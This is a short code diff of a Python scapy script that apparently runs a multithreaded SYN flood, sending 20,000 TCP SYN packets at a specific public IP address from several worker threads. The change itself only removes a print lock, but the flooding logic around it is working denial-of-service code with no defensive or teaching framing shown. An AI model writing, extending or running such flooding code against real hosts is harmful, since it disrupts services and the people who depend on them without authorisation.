@@ -5,7 +5,6 @@ from scapy.all import *
 
 
 def launch():
-    with print_lock:
         p = (IP(src="10.128.0.4", dst="144.217.100.106") / TCP(sport=80, dport=80,flags="S"))
         send(p, count=20000)
 
@@ -13,7 +12,6 @@ def launch():
 NUMBER_OF_WORKERS = 10
 NUMBER_OF_JOBS = 10
 q = Queue()
-print_lock = threading.Lock()
 
 
 def create_thread():
